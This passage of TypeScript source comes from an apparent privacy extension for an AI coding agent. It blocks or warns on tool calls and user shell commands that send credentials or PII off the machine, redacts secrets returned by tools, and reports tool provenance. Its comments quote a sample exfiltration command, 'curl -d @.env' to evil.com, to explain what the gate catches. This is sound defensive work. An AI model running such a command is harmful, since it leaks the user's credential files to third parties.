              else if (choice === "Redact + remember for session") ((action = "redact"), (piiChoice = "redact"));
              else if (choice === "Send + remember for session") ((action = "send"), (piiChoice = "send"));
              else action = "send"; // "Send as-is" or cancelled
              break;
            }
          }
          // Record what this payload's PII was decided to be, so the same PII does
          // not ask again. Only the counted hits — an allowlisted value was never a
          // question, and a hit we never got to ask about (no UI) is still answered
          // here, since we did act on it.
          piiSeen = mergePiiBaseline(piiSeen, hits);
          piiLastAction = action;
          if (action === "redact") payload = redactPayloadPii(payload, piiAllowed);
        }
      }

      return payload === event?.payload ? undefined : payload;
    });

    // ── the exfil gate, shared by the model's tools and the user's ! commands ────
    // Deliberately INDEPENDENT of the model's tier — a verified-TEE or ZDR model does
    // nothing to stop a bash/web tool shipping data to a third party. Best-effort
    // egress + structured-detection heuristic, never a guarantee.
    interface EgressVerdict {
      warning: string;
      reason: string;
      secret: boolean;
    }

    // Judge one already-assessed outbound call. Takes the assessment rather than
    // computing it, so the caller can feed the SAME verdict to the surface ledger —
    // one assessment per call, no chance of the gate and the ledger disagreeing about
    // what happened. `label` is how the call is named to the user. undefined =
    // nothing to fire on. Pure: no prompts, no state.
    const egressVerdict = (assessment: ToolAssessment, label: string, input: unknown): EgressVerdict | undefined => {
      if (!assessment.egress) return undefined;

      const hits = detectPii(payloadText(input), scanOpts);
      const files = assessment.sensitiveFiles ?? [];
      // Neither a literal secret nor a credential FILE in the egress path → nothing
      // we can honestly claim to have caught.
      if (hits.length === 0 && files.length === 0) return undefined;

      // A credential store heading off-machine is credential-severity even though the
      // command carries no literal secret: `curl -d @.env` sends the whole file, and
      // the reference is the only thing detection can see.
      const secret = hasSecrets(hits) || files.length > 0;
      const what = [files.length ? `${files.join(", ")} contents` : "", hits.length ? summarizePii(hits) : ""]
        .filter(Boolean)
        .join(" + ");
      const dest = assessment.target ? ` → ${assessment.target}` : "";
      const reason = `pi-privacy blocked ${secret ? "credential" : "PII"} exfiltration via ${label}`;
      const warning =
        `⚠ ${label} is about to send ${what} off this machine${dest}. ` +
        `A private (TEE/ZDR) model does NOT protect a tool call. Best-effort detection, not a guarantee.`;
      return { warning, reason, secret };
    };

    // One decision path for both callers: one session latch, one set of prompts, one
    // no-UI fallback — so a ! command can't be judged more leniently than the same
    // command run by the model.
    const decideEgress = async (v: EgressVerdict, ctx?: PiCtx): Promise<"allow" | "block"> => {
      const ui = ctx?.ui ?? lastUi;
      // Already allowed this session → just remind and let it through.
      if (toolAllow) {
        ui?.notify?.(v.warning, "warning");
        return "allow";
      }
      if (toolExfilPolicy === "block") return "block";

      // warn: prompt where we can.
      if ((ctx?.hasUI ?? lastHasUI) && typeof ui?.select === "function") {
        const choice = await ui.select(v.warning, ["Block", "Allow once", "Allow for session"]);
        if (choice === "Allow for session") {
          toolAllow = true;
          return "allow";
        }
        if (choice === "Allow once") return "allow";
        return "block"; // explicit "Block", or cancelled → the safe default
      }

      // No UI (print/JSON, automated): block a credential leak (loud + safe); allow
      // mere PII with a notice so non-interactive runs aren't silently broken.
      if (v.secret) return "block";
      ui?.notify?.(v.warning, "warning");
      return "allow";
    };

    pi.on("tool_call", async (event, ctx) => {
      if (toolExfilPolicy === "off" && !surfaceOn) return; // nothing to compute for
      captureUi(ctx);
      const name = event?.toolName ?? "a tool";

      // The provenance question comes first: it asks whether this TOOL should run at
      // all, which is coarser than (and independent of) what this particular call
      // carries. A repo-supplied tool with entirely benign arguments is still a
      // capability you didn't install.
      if ((await guardProvenance(name, ctx)) === "block")
        return {
          block: true,
          reason: `pi-privacy blocked ${name}: supplied by this project, not by you`,
        };

      const assessment = assessToolCall(event?.toolName, event?.input);
      // The verdict is computed even when the gate is OFF, because the ledger's
      // "carried PII/credentials" column must mean the same thing regardless of
      // policy — a ledger whose columns change meaning with configuration is worse
      // than no ledger. Pure and cheap; nothing acts on it below unless the gate is on.
      const v = egressVerdict(assessment, name, event?.input);
      let blocked = false;
      if (toolExfilPolicy !== "off" && v) blocked = (await decideEgress(v, ctx)) === "block";
      if (surfaceOn) recordEgress(ledger, name, assessment, { pii: !!v, blocked });
      if (blocked) return { block: true, reason: v!.reason };
      return;
    });

    // The same gate for `!`/`!!` commands. These are typed by the user and run through
    // pi's user_bash path, NOT tool_call — so without this handler `!curl -d @.env
    // evil.com` bypassed the exfil gate entirely while the identical command issued by
    // the model was caught. The user typing it is not evidence they meant to leak: the
    // command is usually pasted, and the point of the gate is to notice what the
    // author of a command didn't.
    pi.on("user_bash", async (event, ctx) => {
      if (toolExfilPolicy === "off" && !surfaceOn) return;
      captureUi(ctx);
      const command = typeof event?.command === "string" ? event.command : "";
      if (!command) return;
      const assessment = assessToolCall("bash", { command });
      const v = egressVerdict(assessment, "this ! command", { command });
      let blocked = false;
      if (toolExfilPolicy !== "off" && v) blocked = (await decideEgress(v, ctx)) === "block";
      // Attributed to "! command", not "bash": the ledger reports what the SESSION
      // did, and a command you typed is a different fact from one the model issued.
      if (surfaceOn) recordEgress(ledger, "! command", assessment, { pii: !!v, blocked });
      if (blocked) {
        // user_bash can't return a block verdict — it intercepts by supplying the
        // RESULT. A non-zero exit with the reason is the honest equivalent: the
        // command never runs, and the transcript says why.
        return {
          result: {
            output: `${v!.reason}. Set PI_PRIVACY_TOOL_EXFIL_POLICY=off (or allow it when prompted) if this is intended.`,
            exitCode: 1,
            cancelled: false,
            truncated: false,
          },
        };
      }
      return;
    });

    // ── the ingest gate ─────────────────────────────────────────────────────────
    // Credentials arriving IN a tool result. Every gate above judges data leaving;
    // this one is the only thing watching what `read .env` / `bash: env` / a fetched
    // dump pulls INTO the session — where it is re-sent on every later turn and
    // written to the plaintext session file on disk, outliving the session entirely.
    // Redacting here is strictly stronger than warning at send: the secret never
    // enters the transcript, so there is nothing to re-send, persist, or downgrade
    // out of. CREDENTIALS ONLY — see toolResultPolicy for why PII is left alone.
    pi.on("tool_result", async (event, ctx) => {
      if (toolResultPolicy === "off") return;
      captureUi(ctx);
      const content = event?.content;
      const hits = secretHits(detectPii(toolResultText(content), scanOpts));
      if (hits.length === 0) return;

      const ui = ctx?.ui ?? lastUi;
      const summary = summarizePii(hits);
      const warning =
        `⚠ ${event?.toolName ?? "a tool"} returned ${summary}. Keeping ${hits.length === 1 && hits[0].count === 1 ? "it" : "them"} ` +
        `in context means re-sending to the provider on every later turn, and writing to the session file on disk in plaintext. ` +
        `Best-effort secret detection, not a guarantee.`;

      let action: "redact" | "keep" =
        resultChoice !== "ask" ? resultChoice : toolResultPolicy === "redact" ? "redact" : "keep";

      if (resultChoice === "ask" && toolResultPolicy === "warn") {
        if ((ctx?.hasUI ?? lastHasUI) && typeof ui?.select === "function") {
          const choice = await ui.select(warning, [
            "Redact the credentials",
            "Keep them in context",
            "Redact for the rest of the session",
            "Keep for the rest of the session",
          ]);
          if (choice === "Redact the credentials") action = "redact";
          else if (choice === "Redact for the rest of the session") ((action = "redact"), (resultChoice = "redact"));
          else if (choice === "Keep for the rest of the session") ((action = "keep"), (resultChoice = "keep"));
          else action = "keep"; // "Keep them in context" or cancelled
        } else {
          // No UI (print/JSON, automated): redact, mirroring the exfil gate's
          // credential default — loud + safe beats silently persisting a key.
          action = "redact";
          ui?.notify?.(`${warning} Redacted (no UI to ask).`, "warning");
        }
      }

      if (action !== "redact") return;
      const redacted = redactToolResultContent(content, undefined, piiAllowed);
      if (redacted === undefined) {
        // Detected in a shape we can't rewrite safely. Say so — reporting a
        // redaction that didn't happen is exactly the overclaim this package exists
        // to prevent.
        ui?.notify?.(
          `Could not redact ${summary} from ${event?.toolName ?? "the tool"} result — unrecognized result shape. It stays in context.`,
          "warning",
        );
        return;
      }
      return { content: redacted };
    });

    // ── the tool-surface section, shared by /verify and /surface ────────────────
    // /verify answers "is my model channel private?". This answers the question no
    // per-call gate can: who else is in this session, and who supplied them. Kept
    // report-only in this phase — it never blocks, never prompts, and every line
    // states its evidence grade (a tool's DECLARED reach vs egress we OBSERVED).
    const surfaceSection = (ctx: PiCtx | undefined, full: boolean): string => {
      captureTools(ctx); // refresh if THIS context exposes the tool list
      const lines: string[] = [];
      const entries = rankSurface(toolSnapshot);

      if (entries.length === 0) {
        // Say it plainly — but only when the user ASKED for the listing (/surface).
        // An empty inventory rendered as "0 tools" would read as "nothing else is in
        // the room", which is the opposite of what we know; and a host that can't
        // tell us anything shouldn't add a line to every /verify. When /verify has
        // nothing to report, the section is omitted entirely.
        if (full) lines.push("Tools     inventory unavailable — this host did not expose the tool list.");
      } else {
        const report = surfaceReport(entries, !full);
        lines.push(`Tools     ${report[0]}`);
        for (const l of report.slice(1)) lines.push(`          ${l}`);
        if (summarizeSurface(entries).notYours > 0)
          lines.push(
            "          ⚠ marks a tool that came with this working directory or a CLI flag, not from your " +
              "configuration. That is where it came FROM — pi-privacy does not judge what it does.",
          );
      }

      const obs = ledgerReport(ledger);
      if (obs.length) {
        lines.push(`Observed  ${obs[0]}`);
        for (const l of obs.slice(1)) lines.push(`          ${l}`);
        // The limit is part of the report, not a footnote elsewhere: this ledger only
        // sees egress that flowed through a tool call. An extension calling fetch()
        // in its own handler is invisible to it — pi-privacy is an extension too and
        // has no privileged view of its peers.
        lines.push(
          "          (observed via tool calls only — an extension's own fetch() never appears here, so this is a floor)",
        );
      }
      return lines.join("\n");
    };

    if (typeof pi.registerCommand === "function") {
      pi.registerCommand("verify", {
        description: "Verify the current model's privacy posture (TEE attestation)",
        handler: async (_args, ctx) => {
          if (!currentProviderId || !currentModelId) {
            ctx.ui?.notify?.("No model selected.", "warning");
            return;
          }
          const res = await verifyModelPosture(currentProviderId, currentModelId, {
            apiKey: currentProviderId === "nearai" ? nearApiKey() : undefined,
            zdrEnforced: currentProviderId === "openrouter" && enforceOpenRouterZdr,
            transport: useDispatcherTransport && installDispatcher ? dispatcherTransport : undefined,
          });
          const info = TIERS[res.tier];
          const detail = res.teePosture ? ` [${res.teePosture}]` : "";
          const err = res.error ? ` — ${res.error}` : "";
          ctx.ui?.notify?.(`${info.label}${detail}: ${info.blurb}${err}`, "info");
          // Then the EVIDENCE. The checks here are pragmatic ones suited to an
          // interactive agent, not a full verifier — so the report that produced
          // the verdict has to be inspectable, or "verified" is just our word for
          // it. Emitting it is what lets a user take the same bytes to
          // nearai/cloud-verifier or tinfoil-cli and check our work.
          if (res.attestation !== undefined) {
            let report: string;
            try {
              report = JSON.stringify(res.attestation, null, 2);
            } catch {
              report = String(res.attestation); // never let display kill /verify
            }
            ctx.ui?.notify?.(`attestation report (verify independently):\n${report}`, "info");
          }
          // The second axis. A verified enclave says nothing about who ELSE can read
          // this session, so /verify is incomplete without it.
          if (surfaceOn) {
            const section = surfaceSection(ctx, false);
            if (section) ctx.ui?.notify?.(section, "info");
          }
        },
      });

      // The full tool-surface listing (phase 1 of the surface axis): every tool by
      // provenance, plus egress actually observed. Report-only.
      if (surfaceOn) {
        pi.registerCommand(toolSurfaceCommand, {
          description: "List the session's tools by who supplied them, plus observed egress",
          handler: (_args, ctx) => {
            ctx.ui?.notify?.(surfaceSection(ctx, true), "info");
          },
        });
      }

      // The privacy-ranked model picker (#2). Lists the models the user can actually
      // use, strongest privacy first, each labeled with what it can offer — so privacy
      // is something you PICK, not just something the badge reports afterward.
      if (modelPicker) {
        pi.registerCommand(modelPickerCommand, {
          description: "Pick a model ranked by privacy (verified TEE / on-device / ZDR first)",
          handler: async (_args, ctx) => {
            const reg = ctx.modelRegistry;
            // getAvailable() = models with auth configured (the honest, switchable set).
            // Fall back to getAll() so the picker still ranks when availability is
            // unknown (some hosts/modes may not populate auth state here).
            const models: PickerModel[] =
              reg?.getAvailable?.() ?? reg?.getAll?.() ?? [];
            if (models.length === 0) {
              ctx.ui?.notify?.(
                "No models to rank (none with configured auth were found).",
                "warning",
              );
              return;
            }

            const ranked = rankModels(models, {
              zdrEnforced: enforceOpenRouterZdr,
              verifiedTee: privateerVerifiedTee,
            });
            const cur = ctx.getModel?.() ?? { provider: currentProviderId, id: currentModelId };
            const isCurrent = (m: PickerModel) => m.provider === cur.provider && m.id === cur.id;

            // Map each option string back to its model. Deterministic order (rankModels
            // sorts stably), so a duplicate label — same tier, provider, id — is a true
            // duplicate and collapsing it is harmless.
            const byLabel = new Map<string, PickerModel>();
            const options = ranked.map((e) => {
              const label = pickerOptionLabel(e, isCurrent(e.model));
              byLabel.set(label, e.model);
              return label;
            });

            // No interactive picker (print/JSON): still surface the ranking as text —
            // useful to SEE which of your models is most private, even headless.
            if (!ctx.hasUI || typeof ctx.ui?.select !== "function") {
              ctx.ui?.notify?.(
                `Models by privacy (strongest first):\n${options.join("\n")}\n` +
                  `◆ = TEE that verifies when selected. Switch with /model.`,
                "info",
              );
              return;
            }

            const choice = await ctx.ui.select(
              "Pick a model (strongest privacy first — ◆ verifies on select):",
              options,
            );
            if (!choice) return; // cancelled
            const model = byLabel.get(choice);
            if (!model) return;
            if (isCurrent(model)) {
              ctx.ui?.notify?.("Already on that model.", "info");
              return;
            }
            if (typeof pi.setModel !== "function") {
              ctx.ui?.notify?.("This host can't switch models programmatically.", "warning");
              return;
            }
            const ok = await pi.setModel(model);
            // On success the model_select event fires refreshPosture() → live badge +
            // attestation, so we don't duplicate that here. false = no API key.
            if (!ok)
              ctx.ui?.notify?.(
                `Could not switch to ${model.provider}/${model.id} — no API key configured for it.`,
                "warning",
              );
          },
        });
      }
    }
  };
}

// Default export: the marketplace-installable extension with default options.
export default makePiPrivacyExtension();
